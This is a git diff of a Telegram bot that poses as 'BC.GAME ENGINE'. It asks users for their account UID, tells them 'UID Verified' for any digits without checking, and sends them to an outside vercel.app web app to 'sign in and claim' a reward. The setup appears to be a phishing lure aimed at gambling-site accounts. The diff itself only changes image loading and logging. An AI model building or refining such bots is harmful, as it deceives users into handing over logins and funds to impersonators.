@@ -2,12 +2,18 @@ const { Telegraf, Markup } = require('telegraf');
 require('dotenv').config();
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
-const WEBAPP_URL = process.env.WEBAPP_URL || 'https://telegrambot-puce-psi.vercel.app/';
+
+// Ensure URL ends with slash
+let webUrl = process.env.WEBAPP_URL || 'https://telegrambot-navy.vercel.app/';
+if (!webUrl.endsWith('/')) webUrl += '/';
+
+const profileImg = `${webUrl}profile.png`;
+const engineImg = `${webUrl}engine.png`;
 
 bot.start(async (ctx) => {
     try {
-        // Use Image 1 (Profile) for Start
-        await ctx.replyWithPhoto({ source: './profile.png' }, {
+        console.log('Sending start photo:', profileImg);
+        await ctx.replyWithPhoto(profileImg, {
             caption: `<b>Welcome to BC.GAME ENGINE</b>\n\nTo continue, please provide your BC.GAME User ID (UID) to verify your account.`,
             parse_mode: 'HTML',
             ...Markup.inlineKeyboard([
@@ -15,6 +21,7 @@ bot.start(async (ctx) => {
             ])
         });
     } catch (e) {
+        console.error('Bot photo error:', e.message);
         ctx.reply('Welcome! Please enter your User ID to continue.');
     }
 });
@@ -22,20 +29,18 @@ bot.start(async (ctx) => {
 bot.on('text', async (ctx) => {
     const text = ctx.message.text;
     
-    // If it looks like a UID (digits)
     if (/^\d+$/.test(text)) {
         try {
-            // Use Image 2 (Engine Logo) for UID Confirmation
-            await ctx.replyWithPhoto({ source: './engine.png' }, {
+            await ctx.replyWithPhoto(engineImg, {
                 caption: `<b>UID Verified: ${text}</b>\n\nYou are now eligible to claim your reward. Click the button below to sign in and claim.`,
                 parse_mode: 'HTML',
                 ...Markup.inlineKeyboard([
-                    [Markup.button.webApp('Claim Reward', WEBAPP_URL)]
+                    [Markup.button.webApp('Claim Reward', webUrl)]
                 ])
             });
         } catch (e) {
             ctx.reply(`UID Verified: ${text}\nClick below to claim your reward.`, Markup.inlineKeyboard([
-                [Markup.button.webApp('Claim Reward', WEBAPP_URL)]
+                [Markup.button.webApp('Claim Reward', webUrl)]
             ]));
         }
     } else {
@@ -44,7 +49,3 @@ bot.on('text', async (ctx) => {
 });
 
 bot.launch().then(() => console.log('Bot is running...'));
-
-// Enable graceful stop
-process.once('SIGINT', () => bot.stop('SIGINT'));
-process.once('SIGTERM', () => bot.stop('SIGTERM'));
